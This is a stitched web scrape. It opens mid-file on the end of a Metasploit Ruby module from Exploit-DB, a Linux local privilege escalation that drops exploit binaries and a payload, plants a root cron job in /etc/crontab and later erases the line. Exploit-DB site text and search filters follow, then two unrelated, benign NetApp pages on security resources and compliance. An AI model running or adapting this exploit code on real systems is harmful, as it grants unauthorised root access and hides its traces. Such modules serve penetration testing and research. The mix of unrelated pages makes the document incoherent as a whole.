    vprint_good "Kernel version #{release} appears to be vulnerable"

    CheckCode::Appears
  end

  def on_new_session(session)
    if session.type.to_s.eql? 'meterpreter'
      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'
      session.sys.process.execute '/bin/sh', "-c \"/bin/sed -i '\$ d' /etc/crontab\""
    else
      session.shell_command("/bin/sed -i '\$ d' /etc/crontab")
    end
  ensure
    super
  end

  def exploit
    unless check == CheckCode::Appears
      unless datastore['ForceExploit']
        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    if is_root?
      unless datastore['ForceExploit']
        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.'
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    # Upload executables
    subuid_shell_name = ".#{rand_text_alphanumeric 5..10}"
    subuid_shell_path = "#{base_dir}/#{subuid_shell_name}"
    subshell_name = ".#{rand_text_alphanumeric 5..10}"
    subshell_path = "#{base_dir}/#{subshell_name}"
    if live_compile?
      vprint_status 'Live compiling exploit on system...'
      upload_and_compile subuid_shell_path, exploit_data('subuid_shell.c')
      upload_and_compile subshell_path, exploit_data('subshell.c')
    else
      vprint_status 'Dropping pre-compiled exploit on system...'
      upload_and_chmodx subuid_shell_path, exploit_data('subuid_shell.out')
      upload_and_chmodx subshell_path, exploit_data('subshell.out')
    end

    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric 5..10}"
    upload_and_chmodx payload_path, generate_payload_exe

    # Launch exploit
    print_status 'Adding cron job...'
    output = cmd_exec "echo \"echo '* * * * * root #{payload_path}' >> /etc/crontab\" | #{subuid_shell_path} #{subshell_path} "
    output.each_line { |line| vprint_status line.chomp }

    crontab = read_file '/etc/crontab'
    unless crontab.include? payload_path
      fail_with Failure::Unknown, 'Failed to add cronjob'
    end

    print_good 'Success. Waiting for job to run (may take a minute)...'
  end
end

```

**Tags:**
[Metasploit Framework (MSF)](/?tag=3)
[Local](/?tag=22)

**Advisory/Source:**
[Link](https://raw.githubusercontent.com/rapid7/metasploit-framework/66cae6240f3f24d2fc84223c71c1653da4d22152/modules/exploits/linux/local/nested_namespace_idmap_limit_priv_esc.rb)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from security.netapp.com_4ec7319a_20250126_033842.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Resources](https://security.netapp.com/resources)

## Security Resources

With the ever prevalent threats that span todayâs landscape, NetApp continues
to derive and provide security solutions across the portfolio. Links to
security resources are found below. As always, stay tuned because just like the
threat landscape, these resources are ever changing and being updated!

#### Products and Solutions

The product and solutions resources provide guidance, recommendations, and best
practices with regard to security elements and configurations amongst the
NetApp portfolio.

##### ONTAP

[ONTAP 9 Security Datasheet](http://www.netapp.com/us/media/ds-3846.pdf) - The
ONTAP 9 Security Datasheet provides a comprehensive list of security features
and functions available in ONTAP 9 - So if the question is, âwhat are all the
security features/functions in ONTAP 9?â, This is your resource!

[Security Hardening Guide for NetApp ONTAP
9](https://www.netapp.com/us/media/tr-4569.pdf) - We humbly refer to the
Security Hardening Guide for NetApp ONTAP 9 as your key resource when it comes
to answering the question, âhow do I deploy ONTAP 9 in the most secure
fashion?â. The hardening guide provides the recommended commands and configs
necessary to enable ONTAP 9 in the most secure configuration.

[ONTAP 9 Encryption Power
Guide](https://docs.netapp.com/us-en/ontap/pdfs/sidebar/Security_and_data_encryption.pdf)

* When it comes to understanding the configuration and management details of NSE and NVE,
  including deployment, certificates, onboard key management and more, the Power
  Guide is the key resource!

[ONTAP 9 Network Management
Guide](https://docs.netapp.com/us-en/ontap/pdfs/sidebar/Network_management.pdf) - While
this guide provides vast elements surrounding ONTAP networking (IPv4, v6,
IPSpaces, and more), it also captures some key security elements such as
managing SVMs, protocol restrictions and firewall configuration in addition to
control plane elements such as DNS, SNMP, FIPS configuration, and MTU details.
The Network Management Guide also shows list of ports used in ONTAP, also
listed in the hardening guide.

[ONTAP 9 Manage administrator authentication and RBAC with the
CLI](https://docs.netapp.com/us-en/ontap/authentication/)

* You can enable login accounts for ONTAP cluster administrators and storage virtual machine (SVM) administrators.
  You can also use role-based access control (RBAC) to define the capabilities of administrators.

[NFS Kerberos in ONTAP](https://www.netapp.com/pdf.html?item=/media/19384-tr-4616.pdf)

* How to configure NFS Kerberos support in ONTAP for Active Directory and Red Hat Enterprise Linux (RHEL) clients.

[How to configure LDAP in ONTAP Multiprotocol NAS identity
management](https://www.netapp.com/pdf.html?item=/media/19423-tr-4835.pdf)

* Lightweight Directory Access Protocol (LDAP) configuration as a method for UNIX identity
  management and name mapping for multiprotocol NAS access in ONTAP.

[DS-3898: NetApp Storage Encryption and NetApp Volume
Encryption](http://www.netapp.com/us/media/ds-3898.pdf) - When it comes to
encryption at rest there are many questions about the capabilities. The NSE and
NVE Datasheet seeks to quell such questions by providing a comprehensive
understanding of what NSE is, what NVE is, use cases, and how they can be
leveraged individually or together for a true dual/double encryption solution.

[NetApp Storage Encryption
Datasheet](http://www.netapp.com/us/media/ds-3213-en.pdf) - The NSE Datasheet
provides a holistic overview of the NSE solution and use cases. If you have
ever wondered what NSE is, what we mean by self encrypting drives, or what
encryption algorithm is in use, this is the resource for you!

[NetApp Volume Encryption
Datasheet](http://www.netapp.com/us/media/ds-3899.pdf) - The NVE Datasheet
provides a holistic overview of the NVE solution and use cases. If you have
ever wondered what NVE is, or what encryption algorithm it uses, this is the
resource for you!

[ONTAP 9.x STIG](https://public.cyber.mil/stigs/downloads/?_dl_facet_stigs=network-other)

* Ver 1, Rel 1 of the NetApp ONTAP DSC 9.x STIG has been posted to the Security
  Technical Implementation Guides (STIGs) Document Library.

#### Threats

Threat resources consist of guidance to address known threats through a
combination of prevention, mitigation, and remediation.

##### Ransomware

[The NetApp Solution for
Ransomware](http://www.netapp.com/us/media/tr-4572.pdf) - Ransomware wages war
on every environment. Being the custodians of one of the worldâs most valuable
resources (data/information), itâs imperative that we protect it. When it comes
to ransomware, this is your guide to addressing and remediating the threat.

[NetApp and Varonis ransomware white
paper](https://info.varonis.com/hubfs/docs/whitepapers/en/Varonis-Ransomware-Whitepaper-Netapp.pdf) -
As a companion to the NetApp Solution for Ransomware, we have partnered with
Varonis in addressing the advanced techniques around this threat. We have
discussed and captured the solution in this joint white paper.

#### Integration and Solutions Guides

As we continue to tout the key elements of security including key management,
we understand the challenges and value of timeliness as it applies to adoption
and deployment. Due to such challenges we provide integration guides where we
walk through the configuration/provisioning of âkeyâ elements such as key
managers, FPolicy, and other security laden integration solutions.

##### Key Management

[NetApp ONTAP 9 External Key Management: Vormetric Key Management Integration
Guide](http://www.netapp.com/us/media/tr-4618.pdf) - The Vormetric integration
guide for ONTAP 9 depicts how to provision the Vormetric (Thales) key manager
for use with ONTAP 9.

##### FPolicy

[Cloud Insights with Cloud Secure](https://cloud.netapp.com/ci-sde-plp-cloud-secure-info-trial?hsCtaTracking=fefadff4-c195-4b6a-95e3-265d8ce7c0cd%7Cb696fdde-c026-4007-a39e-5e986c4d27c6)

[FPolicy Solution Guide for Clustered Data ONTAP: Varonis DatAdvantage](http://www.netapp.com/us/media/tr-4429.pdf)

[FPolicy Solution Guide for Clustered Data ONTAP: Veritas Data Insight](http://www.netapp.com/us/media/tr-4473.pdf)

##### Anti-Virus

[Antivirus Solution Guide for McAfee](https://www.netapp.com/us/media/tr-4286.pdf)

[Antivirus Solution Guide for Symantec](https://www.netapp.com/us/media/tr-4304.pdf)

[Antivirus Solution Guide for Trend Micro](https://www.netapp.com/us/media/tr-4312.pdf)

#### Compliance

Compliance continues to evolve and shape the manner in which we address the
organizationâs of today and more importantly how we address securing the data.
Remember Security does not equal Compliance, but security does in fact aid in
addressing the challenge.

##### PCI DSS

[ONTAP PCI DSS](http://www.netapp.com/us/media/tr-4401.pdf)

#### Security Partners

[Varonis](https://www.varonis.com/)

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from security.netapp.com_3c97cd24_20250126_033836.html ===


* Sign in

  Welcome!

  An account will enable you to access:

  + NetApp support's essential features
  + NetApp communities
  + NetApp training
  + [Sign in to my dashboard](/LoginEntity/SignIn "Sign in")
  + [Create an account](https://mysupport.netapp.com/site/user/registration "Create an account")

  NetApp account
  + [NetApp dashboard](/account/)
  + [Sign out](/LoginEntity/SignOut)
* * English

    Language
    + [English](/esg/trust-center/compliance/)
    + [Deutsch](/de/esg/trust-center/compliance/)
    + [Español](/es/esg/trust-center/compliance/)
    + [Français](/fr/esg/trust-center/compliance/)
    + [Italiano](/it/esg/trust-center/compliance/)
    + [Português](/pt/esg/trust-center/compliance/)
    + [日本語](/ja/esg/trust-center/compliance/)
    + [한국어](/ko/esg/trust-center/compliance/)
    + [简体中文](/zh-hans/esg/trust-center/compliance/)
    + [繁體中文](/zh-hant/esg/trust-center/compliance/)
     [See your global contacts](/company/contact-us/)
* All NetApp

  + [NetApp.com](https://www.netapp.com/)
  + [BlueXP](https://bluexp.netapp.com/)
  + [Instaclustr](https://www.instaclustr.com/)
  + [Spot](https://spot.io/)
  Learn
  + [Support](https://mysupport.netapp.com/)
  + [Documentation](/support-and-training/documentation/)
  + [Knowledge Base](https://kb.netapp.com/)
  + [Learning Services](/support-and-training/netapp-learning-services/)
  Browse
  + [Community](https://community.netapp.com/)
  + [Hardware Universe](https://hwu.netapp.com/)
  + [Partner Hub](https://partnerhub.netapp.com)

* Solutions & Products
  Solutions & Products

  Data Storage
  + [Unified Data Storage

    Store any data for any workload anywhere](/unified-storage/ "Unified Data Storage")
  + [Storage Systems

    Modernize and simplify your storage environment](/data-storage/ "Storage Systems")
  + [Storage as a Service

    Flexible pay-as-you-go consumption models](/services/keystone/ "Storage as a Service")
  + [Public Clouds

    Simplify your cloud management landscape](/cloud-services/ "Public Clouds")
  + [AWS](/aws/ "AWS")
  + [Google Cloud](/google-cloud/ "Google Cloud")
  + [Microsoft Azure](/azure/ "Microsoft Azure")
  Data Management
  + [Intelligent Services

    Manage any storage, any cloud, anywhere](/intelligent-services/ "Intelligent Services")
  + [Artificial Intelligence

    Enable efficient data collection and workloads](/artificial-intelligence/ "Artificial Intelligence")
  + [Cyber Resilience

    Protect and secure your sensitive company data](/cyber-resilience/ "Cyber Resilience")
  + [Data Services

    Maintain complete control over your data](/data-management/ "Data Services")
  + [DevOps

    Reduce friction, accelerate development and productivity](/devops-solutions/ "DevOps")
  + [Enterprise Applications

    Modernize and migrate apps, improve quality, reduce risk](/enterprise-applications/ "Enterprise Applications")
  + [Infrastructure and Workload Services

    Optimize performance, efficiency, and availability](/infrastructure-workload-services/ "Infrastructure and Workload Services")

  + [BlueXP](/bluexp/ "BlueXP")
  + [View solutions](/storage-solutions/ "View solutions")
  + [View services](/services/ "View services")
  + [View products A-Z](/products-a-z/ "View products A-Z")
  + [Product updates](/product-updates/ "Product updates")
* Explore NetApp
  Explore NetApp
  [![](data:image/gif;base64...)
  The intelligent data infrastructure company

  Explore innovative solutions that transform how businesses harness the power of data.](/intelligent-data-infrastructure/ "The intelligent data infrastructure company")

  Built for you
  + [Industries we serve](/industries/ "Industries we serve")
  + [Customer experience](/customer-experience/ "Customer experience")
  + [NetApp Thought Leadership](/thought-leadership/ "NetApp Thought Leadership")
  + [Success stories](/customers/#t=CustomerStories&sort=relevancy&f:@facet_language_mktg=[English] "Success stories")About NetApp
  + [Company story](/company/ "Company story")
  + [Become a partner](/partners/become-a-partner/ "Become a partner")
  + [Contact NetApp](/company/contact-us/ "Contact NetApp")
* How to Buy
  How to Buy
  [![](data:image/gif;base64...)
  Storage as a service

  NetApp Keystone gives you flexible pay-as-you-go cloud consumption models whether you’re on-premises or in the cloud.](/services/keystone/ "Storage as a service")

  Ready to Try?
  + [Test drive a product](/test-drives/ "Test drive a product")
  + [Start a free trial](/how-to-buy/trials-test-drives/ "Start a free trial")Ready to buy?
  + [Contact sales](/forms/sales-contact/ "Contact sales")
  + [Connect with a partner](/partners/partner-connect/#t=Partners&sort=%40partnerweight%20descending&layout=card&f:@facet_language_mktg=[English] "Connect with a partner")
  + [Sales and Services Ts & Cs](/how-to-buy/sales-terms-and-conditions/ "Sales and Services Ts & Cs")
* Support & Training
  Support & Training
  [![](data:image/gif;base64...)
  Join our community

  Get involved with the best community around. NetApp and customers helping each other find answers through discussion threads.](https://community.netapp.com/ "Join our community")

  Get Help
  + [Technical support](https://mysupport.netapp.com/ "Technical support")
  + [Support services](/services/support/ "Support services")
  + [Keystone support](https://netappgssc.service-now.com/csm/ "Keystone support")
  + [Knowledge base](https://kb.netapp.com/ "Knowledge base")
  + [Downloads](https://mysupport.netapp.com/site/downloads/ "Downloads")Education & Training
  + [Training & certifications](/support-and-training/netapp-learning-services/ "Training & certifications")
  + [Product documentation](/support-and-training/documentation/ "Product documentation")
  + [NetApp Developer](/developer/ "NetApp Developer")

[Sign in to my dashboard](/account "Sign in")
[Create an account](https://mysupport.netapp.com/site/user/registration "Create an account")

English

Menu

[Trust Center](/esg/trust-center/)

![Magnify glass on gray background ](/media/magnify-title-web2x_tcm19-31734.jpg?v=160709)

# Compliance: Data security and data privacy

Contents

* [Overview: NetApp compliance offerings](#prose 1 "Overview: NetApp compliance offerings")
* [California Consumer Privacy Act (CCPA) & California Privacy Rights Act (CPRA)](#prose 2 "California Consumer Privacy Act (CCPA) & California Privacy Rights Act (CPRA)")
* [Commercial Solutions for Classified (CSfC) Program](#proseCSfC "Commercial Solutions for Classified (CSfC) Program")
* [Common Criteria](#prose 3 "Common Criteria")
* [DoDIN APL](#prose 4 "DoDIN APL")
* [DoD Cloud Computing Security Requirements Guide (CC SRG)](#prose4-2 "DoD Cloud Computing Security Requirements Guide (CC SRG)")
* [FedRAMP](#prose 5 "FedRAMP")
* [FIPS 140](#prose 6 "FIPS 140")
* [General Data Protection Regulation (GDPR)](#prose 7 "General Data Protection Regulation (GDPR)")
* [Health Insurance Portability and Accountability Act (HIPAA)](#prose 8 "Health Insurance Portability and Accountability Act (HIPAA)")
* [ISO/IEC 27001](#prose 9 "ISO/IEC 27001")
* [NF203](#NF203 "NF203")
* [Payment Card Industry Data Security Standard (PCI DSS)](#prose11 "Payment Card Industry Data Security Standard (PCI DSS)")
* [SOC 2 Reports](#prose 12 "SOC 2 Reports")

#### Share this page

August 2023

NetApp has a long-held and ongoing commitment to compliance with the ever-evolving set of global, regional, and data security and privacy standards and regulations. We uphold this commitment through self-assessments and rigorous audits by independent accredited third parties. These audits validate the adherence of our products and services to the requirements of such standards as ISO/IEC 27001, the GDPR, and the Common Criteria. These assessments help demonstrate NetApp’s integration of internationally recognized processes and best practices in our business, enabling customers to use our products and services regardless of their compliance needs.

NetApp supplies information for each compliance offering (listed at left) that includes a list of in-scope software and hardware and links to the relevant certificates and auditor’s reports.

> ### Starting on a foundation of globally recognized standards means that digital transformation can follow a known roadmap of security and privacy compliance.
>
>
> Biren Fondekar,
>
> Chief Transformation Officer,
>
> NetApp

## Overview: NetApp compliance offerings

Get a complete list of all NetApp services, hardware, and software that comply with global, regional, and industry-specific data security, engineering, and privacy regulations and standards governing the collection and use of data.

* [Learn more](/esg/trust-center/compliance/netapp-compliance-offerings/ "Learn more ")

## California Consumer Privacy Act (CCPA) & California Privacy Rights Act (CPRA)

NetApp is committed to respecting consumers’ privacy rights and operating in compliance with global data privacy laws, including the California Consumer Privacy Act (CCPA) and its expansion, the California Privacy Rights Act (CPRA). Our contractual commitments to legal compliance, include our Privacy Policy and customer contracts. These are based on whether we are collecting customers’ personal data or acting as a service provider to customers who are collecting personal data. We back these contractual commitments with processes and policies designed to comply with the CCPA and CPRA.

* [Learn more](/esg/trust-center/privacy/CCPA-california-consumer-privacy-act/ "Learn more")

## Commercial Solutions for Classified (CSfC) Program

NetApp ONTAP data management software is the first enterprise-class storage solution validated by the Commercial Solutions for Classified (CSfC) Program. It enables enhanced security protection for data at rest at both the hardware and software layers. The CSfC Program is a key component of the U.S. National Security Agency (NSA) commercial cybersecurity strategy. It validates commercial products that meet the rigorous security requirements for protecting classified secret and top-secret data.

* [Learn more](/esg/trust-center/compliance/CSfC-Program/ "Learn more ")

## Common Criteria

Continuing a certification tradition dating back to 2005, when NetApp Data ONTAP was first certified, NetApp has achieved Common Criteria (ISO/IEC 15408-1:2009) certification for its storage software and hardware products. Independent accredited testing laboratories audited NetApp products and certified their compliance with Common Criteria. NetApp government and government contractor customers can rely on our Common Criteria certification for their purchasing requirements.

* [Learn more](/esg/trust-center/compliance/common-criteria/ "Learn more")

## DoDIN APL

NetApp ONTAP was first certified in 2005 by the U.S. Defense Information Systems Agency (DISA). DISA placed in-scope NetApp products on the U.S. Department of Defense Information Network Approved Products List (DoDIN APL). Certification of NetApp products to the DoDIN APL enables U.S. defense agencies and organizations supporting the defense industrial base to use them with confidence.

* [Learn more](/esg/trust-center/compliance/dodin-apl/ "Learn more")

## DoD Cloud Computing Security Requirements Guide (CC SRG)

Amazon FSx for NetApp ONTAP is authorized for U.S. Department of Defense (DoD) Cloud Computing Security Requirements Guide (CC SRG) Impact Levels 2, 4, and 5 in the Amazon Web Services (AWS) GovCloud (US) Regions and Impact Level 2 in AWS US Regions.

* [Learn more](/esg/trust-center/compliance/dod-cc-srg/ "Learn more")

## FedRAMP

Both Amazon FSx for NetApp ONTAP (through Amazon Web Services) and Azure NetApp Files® (through Microsoft Azure and Microsoft Azure Government) have obtained a P-ATO from the Joint Authorization Board (JAB), the primary governance body for FedRAMP.

Amazon FSx for NetApp ONTAP has FedRAMP authorization at the High and Moderate Impact Levels for AWS US Regions and the High Impact Level for AWS GovCloud (US) Regions. Azure NetApp Files® has FedRAMP authorization at both High and Medium Impact Levels for Azure commercial cloud services and a High Impact Level for Azure Government cloud services.

* [Learn more](/esg/trust-center/compliance/FedRAMP/ "Learn more")

## FIPS 140

FIPS 140 is a U.S. government standard that sets security requirements for cryptographic modules in hardware, software, and firmware, and NetApp offers cryptographic modules that have achieved FIPS 140 validation. NetApp offers a variety of hardware, software, and services and therefore takes a variety of approaches to FIPS 140 compliance. For example, for covered software, NetApp includes cryptographic modules that have achieved level 1 validation for the encryption of data in transit and at rest.

* [Learn more](/esg/trust-center/compliance/fips-140/ "Learn more")

## General Data Protection Regulation (GDPR)

NetApp maintains a comprehensive strategy for compliance with data privacy laws, including the EU General Data Protection Regulation (GDPR). We back our commitments through organizational and engineering measures designed to respect the rights of data subjects and securely process personal information in compliance with the GDPR and our European regulators. Whether your enterprise is a data controller or data processor, NetApp products and services offer the tools necessary to implement programs that support your compliance with the GDPR. We back these commitments with a number of customer contracts.

* [Learn more](/esg/trust-center/privacy/gdpr-compliance/ "Learn more")

## Health Insurance Portability and Accountability Act (HIPAA)

Customers managing data regulated under the Health Insurance Portability and Accountability Act (HIPAA) can take advantage of a variety of NetApp products and services for storage management.

To support the HIPAA compliance of NetApp services , Net App relies on our SOC 2 Type 2 certifications by an independent third party. SOC 2 reports offer assurance to customers that NetApp controls reasonably protect the confidentiality and privacy of user information processed by NetApp systems. NetApp solutions with SOC 2 Type 2 reports may also be available to covered entities or business associates for their management of protected health information.

* [Learn more](/esg/trust-center/compliance/HIPAA/ "Learn more")

## ISO/IEC 27001

Annually, NetApp engages an accredited certification body, which has certified that the NetApp Information Security Management System demonstrates conformance to the ISO 27001 standard. Our auditor has verified that NetApp policies, procedures, and controls maintain the privacy, security, integrity, and availability of information.

* [Learn more](/esg/trust-center/compliance/iso-27001/ "Learn more")

## NF203

After an extensive audit, the accredited certifying body INFOCERT has renewed the certification of NetApp® StorageGRID® to the French accounting standard NF Logiciel (NF203). This renewal includes certification to the international standard for how products are developed, tested, and validated, ISO/IEC 25051.

* [Learn more](/esg/trust-center/compliance/nf203/ "Learn more")

## Payment Card Industry Data Security Standard (PCI DSS)

Compliance with the Payment Card Industry Data Security Standard (PCI DSS) is required of all companies that process, store, or transmit credit card information through the five major payment card brands. Instaclustr™ by NetApp® has been certified as compliant with the PCI DSS at Level 1—the highest level of transactions.

* [Learn more](/esg/trust-center/compliance/pci-dss/ "Learn more")

## SOC 2 Reports

NetApp products and services are audited regularly against the SOC 2 (AT Section 101) standard by an independent certified public accountant firm and services auditor. They examined NetApp in-scope cloud and managed services, and affirmed that they have achieved SOC 2 reports based on the applicable Trust Services Criteria.

* [Learn more](/esg/trust-center/compliance/soc-2/ "Learn more")

Back To Top

Website

* [Industries](/industries/)
* [Customer stories](/customers/)
* [How to buy](/how-to-buy/)
* [Spot by NetApp](https://spot.io/)
* [Products A-Z](/products-a-z/)
* [Product Updates](/product-updates/#t=ProductUpdates&sort=%40publish_date_mktg%20descending)

Support

* [Support & training](/support-and-training/)
* [Knowledge base](https://kb.netapp.com/)
* [Knowledge center](/knowledge-center/)
* [Documentation](/support-and-training/documentation/)
* [Community](https://community.netapp.com/)

NetApp

* [Company](/company/)
* [Partners](/partners/)
* [Careers](https://careers.netapp.com/)
* [Investors](https://investors.netapp.com/)
* [Trust Center](/esg/trust-center/)
* [Quality certifications](/company/quality-certifications/)
* [Environmental, social & governance](/esg/)

Resources

* [Newsroom](/newsroom/)
* [Events](/company/events/)
* [Blog](/blog/)
* [Executive briefing](/company/executive-briefing-center/)

